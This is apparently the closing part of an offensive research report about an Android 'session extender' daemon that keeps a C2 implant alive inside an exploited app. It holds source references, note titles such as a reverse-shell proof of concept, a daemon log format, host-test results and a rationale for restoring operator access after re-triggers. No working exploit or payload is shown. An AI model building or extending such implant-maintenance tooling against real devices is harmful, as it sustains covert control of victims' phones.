* `services/core/java/com/android/server/pm/PackageInstallerSession.java:2840-2844,2887-2891`
* `services/core/java/com/android/server/wm/BackgroundActivityStartController.java:180-341`
* `services/core/java/com/android/server/wm/BackgroundLaunchProcessController.java:76-120`
* `services/core/java/com/android/server/notification/NotificationManagerService.java:6570-6580,6626-6633`
* `services/core/java/com/android/server/alarm/AlarmManagerService.java:341-342,1875-1876,4824-4833,4875-4880`
* `services/core/java/com/android/server/am/ActiveServices.java:2829-2834`
* `services/core/java/com/android/server/JobSchedulerService.java:910-980`

Project notes:

* `notes/android_update_daemon_survival.md` (parallel; same verdict)
* `notes/update_widget_cache.md` (widget seed, no auto-trigger)
* `notes/persistence_20261101.md` (force-stop cgroup measurement)
* `notes/reverse_shell_poc.md` (detached shell, force-stop)
* `notes/persistence_local_existing_rce.md` (ART app image candidate; crashes)
* `notes/native_appdata_audit.md` (native loader root-gated)
* `notes/regexp1827_class64_v3_device_fix.md` (device payload)
* `REPORT_20261102.md` §6 (C2 supervisor limits; not modified)

Device evidence:

* `evidence/evidence_20261101/new_beta_72799/nb_v4_run2.log:12274-12279`
* `evidence/evidence_20261101/new_beta_72799/nb_v2_run10.log:11990`
* `evidence/evidence_20261101/persistence/` (force-stop; root control)
* `lab/qjs_postsnapshot/loaders/size_variants/sony_sweep/runs/b5_idle60/logcat.txt:1777`

---

## Appendix A — daemon state machine (log lines)

```
START version=0.1 pid=... pkg=... uid=10357 dir=...
SELF cgroup=0::/uid_10357/pid_<app>; exe=/system/bin/sh
INIT apk=/data/app/.../base.apk sig=... app_pid=<app> app_cgroup=0::/uid_10357/pid_<app>;
APP_PID old=<pid> new=<pid>            # app restarted
APP_CGROUP pid=<pid> cgroup=...        # first time the app pid is seen
APK_CHANGED old=... new=...            # update path change
APK_SIG_CHANGED old=... new=...        # in-place change
APP_GONE old=<pid>                     # app disappeared
TRIGGER begin app_pid= apk=...
TRIGGER chat rc=... out=...            # includes the BAL denial verbatim
C2_START supervisor
STOP pid=... reason=stop
```

The `hb` file is an atomic epoch timestamp; `state` is `key=value` with the
same fields. A daemon that dies in the update leaves the last heartbeat and no
`STOP`; that is the expected post-update log (the `STOP` is written only on a
clean TERM/stop).

## Appendix B — host test

```
$ cd lab/local_ace_daemon && dash host/run_host_test.sh
...
PASS=35 FAIL=0
work dir: /tmp/opencode/ace-test.XXXXXX
```

Raw output: `lab/local_ace_daemon/results/host_test_20261102.txt`.

The suite runs the daemon under dash with mock `am`/`pm`/`pidof`, checks the
generated bootstrap, duplicate lock, state/heartbeat, app-PID disappearance,
APK signature change, trigger invocation, stop/lock cleanup, bootstrap
idempotence, the trigger script, a simulated BAL denial, log rotation and the
absence of bashisms; both scripts are syntax-checked with dash and busybox sh.
It is host-only; it does not prove device behavior.

## Appendix C — why the daemon is still useful

The daemon is not useless just because it is not persistent. While the app is
alive, it:

* keeps the C2 implant/supervisor alive across the widget sandbox teardown
  and a transport failure;
* logs the app PID, cgroup, APK path and update timeline — the evidence needed
  to distinguish "died with the app" from "died of the update";
* tries the re-trigger and records the exact BAL refusal, instead of leaving a
  silent failure;
* is re-created by the app-data seed after each re-trigger, so the operator
  gets the C2 back without a new exploit.

It is a **session extender and evidence collector**, not a persistence layer.
